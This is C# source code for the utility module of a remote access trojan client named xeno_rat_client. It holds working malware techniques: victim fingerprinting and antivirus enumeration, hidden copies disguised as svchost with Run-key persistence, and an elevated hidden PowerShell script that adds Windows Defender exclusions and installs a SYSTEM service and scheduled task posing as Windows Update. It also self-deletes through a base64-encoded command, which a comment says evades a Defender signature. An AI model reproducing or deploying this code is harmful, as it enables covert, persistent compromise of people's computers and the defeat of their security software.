using Microsoft.Win32;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace xeno_rat_client
{
    public class Utils
    {
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);


        [DllImport("user32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        public static async Task<string> GetCaptionOfActiveWindowAsync() 
        {
            return await Task.Run(() => GetCaptionOfActiveWindow());
        }
        public static string GetCaptionOfActiveWindow()
        {
            string strTitle = string.Empty;
            IntPtr handle = GetForegroundWindow();
            int intLength = GetWindowTextLength(handle) + 1;
            StringBuilder stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }
            try
            {
                uint pid;
                GetWindowThreadProcessId(handle, out pid);
                Process proc=Process.GetProcessById((int)pid);
                if (strTitle == "")
                {
                    strTitle = proc.ProcessName;
                }
                else 
                {
                    strTitle = proc.ProcessName + " - " + strTitle;
                }
                proc.Dispose();
            }
            catch 
            { 
                
            }
            return strTitle;
        }

        public static bool IsAdmin()
        {
            bool admin = false;
            try
            {
                admin = IsUserAnAdmin();
            }
            catch { }
            return admin;
        }
        public static string GetAntivirus()
        {
            List<string> antivirus = new List<string>();
            try
            {
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        string anti = Instance.GetPropertyValue("displayName").ToString();
                        if (!antivirus.Contains(anti)) 
                        {
                            antivirus.Add(anti);
                        }
                        Instance.Dispose();
                    }
                    if (antivirus.Count == 0) 
                    {
                        antivirus.Add("N/A");
                    }   
                }
                return string.Join(", ", antivirus);
            }
            catch
            {
                if (antivirus.Count == 0)
                {
                    antivirus.Add("N/A");
                }
                return string.Join(", ", antivirus);
            }
        }

        public static string GetWindowsVersion()
        {
            string r = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                ManagementObjectCollection information = searcher.Get();
                if (information != null)
                {
                    foreach (ManagementObject obj in information)
                    {
                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
                    }
                    information.Dispose();
                }
            }
            return r;
        }
        public static string HWID()
        {
            try
            {
                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion,new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
            }
            catch
            {
                return "UNKNOWN";
            }
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(type, ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }
        public async static Task RemoveStartup(string executablePath) 
        {
            await Task.Run(() =>
            {
                if (Utils.IsAdmin())
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "schtasks.exe";
                        process.StartInfo.Arguments = $"/query /v /fo csv";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        try { process.WaitForExit(); } catch { }
                        process.Dispose();
                        string[] csv_data = output.Split('\n');
                        if (csv_data.Length > 1)
                        {
                            List<string> keys = csv_data[0].Replace("\"", "").Split(',').ToList();
                            int nameKey = keys.IndexOf("TaskName");
                            int actionKey = keys.IndexOf("Task To Run");
                            foreach (string csv in csv_data)
                            {
                                string[] items = csv.Split(new string[] { "\",\"" }, StringSplitOptions.None);
                                if (keys.Count != items.Length)
                                {
                                    continue;
                                }
                                if (nameKey == -1 || actionKey == -1)
                                {
                                    continue;
                                }

                                if (items[actionKey].Replace("\"", "").Trim() == executablePath)
                                {
                                    try
                                    {
                                        Process proc = new Process();
                                        proc.StartInfo.FileName = "schtasks.exe";
                                        proc.StartInfo.Arguments = $"/delete /tn \"{items[nameKey]}\" /f";
                                        proc.StartInfo.UseShellExecute = false;
                                        proc.StartInfo.RedirectStandardOutput = true;
                                        proc.StartInfo.CreateNoWindow = true;

                                        proc.Start();
                                        try { proc.WaitForExit(); } catch { }
                                        process.Dispose();
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                    catch { }
                }
                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                try
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                    {
                        foreach (string i in key.GetValueNames())
                        {
                            if (key.GetValue(i).ToString().Replace("\"", "").Trim() == executablePath)
                            {
                                key.DeleteValue(i);
                            }
                        }
                    }
                }
                catch
                {
                }
            });

            
        }
        public async static Task Uninstall() 
        {
            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
            await RemoveStartup(Assembly.GetEntryAssembly().Location);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + Assembly.GetEntryAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Process.GetCurrentProcess().Kill();
        }

        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name = "WindowsDefenderService")
        {
            return await Task.Run(() =>
            {
                try
                {
                    string[] possiblePaths = new string[]
                    {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Updates"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Cache"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft", "Windows", "SystemApps")
                    };

                    string selectedPath = possiblePaths[new Random().Next(possiblePaths.Length)];
                    Directory.CreateDirectory(selectedPath);

                    string newFileName = "svchost" + new Random().Next(1000, 9999) + ".exe";
                    string newPath = Path.Combine(selectedPath, newFileName);

                    if (File.Exists(newPath)) File.Delete(newPath);
                    File.Copy(executablePath, newPath);
                    File.SetAttributes(newPath, FileAttributes.Hidden | FileAttributes.System);

                    string[] keyPaths = new string[] {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
            };

                    foreach (string keyPath in keyPaths)
                    {
                        try
                        {
                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser,
                                Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)
                                .OpenSubKey(keyPath, true))
                            {
                                string randomName = name + "_" + Path.GetRandomFileName().Replace(".", "");
                                key.SetValue(randomName, $"\"{newPath}\" -windowstyle hidden");
                                return true;
                            }
                        }
                        catch { continue; }
                    }
                }
                catch { }
                return false;
            });
        }
        //*//
        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "WindowsDefenderService")
        {
            try
            {
                string scriptContent = $@"
            if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {{
                exit 1
            }}

            taskkill /F /IM '{Path.GetFileName(executablePath)}' 2>$null
            Start-Sleep -Seconds 2

            $systemPath = 'C:\Windows\System32\Microsoft\WindowsUpdate'
            $backupPath = 'C:\Windows\SysWOW64\Microsoft\WindowsUpdate'
            
            foreach($path in @($systemPath, $backupPath)) {{
                if(!(Test-Path $path)) {{
                    New-Item -ItemType Directory -Force -Path $path | Out-Null
                }}
            }}

            $serviceName = 'Windows Update Manager'
            $binaryPath = Join-Path $systemPath '{name}.exe'
            
            Copy-Item -Path '{executablePath}' -Destination $binaryPath -Force
            Copy-Item -Path '{executablePath}' -Destination (Join-Path $backupPath '{name}.exe') -Force

            $paths = @($systemPath, $backupPath)
            foreach($path in $paths) {{
                Add-MpPreference -ExclusionPath $path -Force -ErrorAction SilentlyContinue
                Add-MpPreference -ExclusionProcess (Join-Path $path '{name}.exe') -Force -ErrorAction SilentlyContinue
            }}

            $service = New-Service -Name '{name}' -BinaryPathName $binaryPath -DisplayName $serviceName -StartupType Automatic -ErrorAction SilentlyContinue

            sc.exe config {name} start= auto
            sc.exe failure {name} reset= 0 actions= restart/60000/restart/60000/restart/60000
            
            $action = New-ScheduledTaskAction -Execute $binaryPath
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
            Register-ScheduledTask -TaskName 'Microsoft\Windows\WindowsUpdate\{name}' -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

            Start-Service -Name '{name}' -ErrorAction SilentlyContinue
            Start-ScheduledTask -TaskName 'Microsoft\Windows\WindowsUpdate\{name}' -ErrorAction SilentlyContinue
            
            Start-Process -FilePath $binaryPath -WindowStyle Hidden
            exit 0
        ";

                string scriptPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".ps1");
                File.WriteAllText(scriptPath, scriptContent);

                using (Process process = new Process())
                {
                    process.StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {{. '{scriptPath}'; exit $LASTEXITCODE}}\"",
                        UseShellExecute = true,
                        Verb = "runas",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    };

                    process.Start();
                    await Task.Delay(30000);
                    try { File.Delete(scriptPath); } catch { }
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        //*//
        public static async Task<uint> GetIdleTimeAsync() 
        {
            return await Task.Run(() => GetIdleTime());
        }
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);
            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }

    }
}
